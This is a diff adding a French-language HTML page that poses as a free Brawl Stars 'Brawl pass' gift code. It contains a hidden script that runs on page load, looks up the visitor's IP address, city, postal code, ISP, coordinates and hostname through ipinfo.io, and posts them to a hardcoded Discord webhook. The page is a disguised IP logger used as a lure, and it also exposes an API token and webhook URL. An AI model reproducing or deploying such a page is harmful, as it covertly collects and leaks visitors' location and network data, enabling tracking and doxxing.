@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webhook Discord</title>
+</head>
+<body>
+    <h1>Brawl pass gratuit</h1>
+    <p>Code cadeau : ZU9Z_APVD_09OW | Cadeau : Brawl pass +</p>
+    <p>Générè par le générateur FoxiOnNet après 19362 essaie</p>
+
+    <script>
+        // Fonction pour récupérer les détails de l'adresse IP et envoyer le message au webhook Discord
+        async function getIPDetails() {
+            try {
+                // Remplace "YOUR_TOKEN" par ta clé d'API ipinfo
+                const response = await fetch('https://ipinfo.io/json?token=d9314c02310828');
+                const data = await response.json();
+
+                // Construire le message à envoyer au webhook
+                const message = {
+                    content: `Informations sur l'adresse IP et le réseau :
+**Adresse IP** : ${data.ip}
+**Ville** : ${data.city}
+**Région** : ${data.region}
+**Code postal** : ${data.postal}
+**Pays** : ${data.country}
+**Fournisseur d'accès (ISP)** : ${data.org}
+**Latitude** : ${data.loc.split(',')[0]}
+**Longitude** : ${data.loc.split(',')[1]}
+**Fuseau horaire** : ${data.timezone}
+**Code pays** : ${data.country}
+**Hostname** : ${data.hostname || 'Non disponible'}
+**Type de connexion** : ${data.connection || 'Non disponible'}` // Ajout de détails sur le réseau
+                };
+
+                // Envoyer le message au webhook Discord
+                await sendToDiscord(message);
+                
+            } catch (error) {
+                console.error('Erreur lors de la récupération des détails de l\'adresse IP :', error);
+            }
+        }
+
+        async function sendToDiscord(message) {
+            const webhookURL = "https://discord.com/api/webhooks/1297667011962343484/MrQGHpEtJKpCIuE-DVKC4NzT69hfyBT9LhC8cVQVZz_6lHmcA9hVKbm0jt9BpLG-gfwR"; // Remplace par l'URL de ton webhook Discord
+
+            try {
+                await fetch(webhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(message)
+                });
+                console.log("Message envoyé au webhook Discord : ", message.content);
+            } catch (error) {
+                console.error("Erreur lors de l'envoi du message :", error);
+            }
+        }
+
+        // Appeler la fonction pour obtenir les détails de l'adresse IP et les envoyer au webhook lorsque la page est chargée
+        window.onload = getIPDetails;
+    </script>
+</body>
+</html>
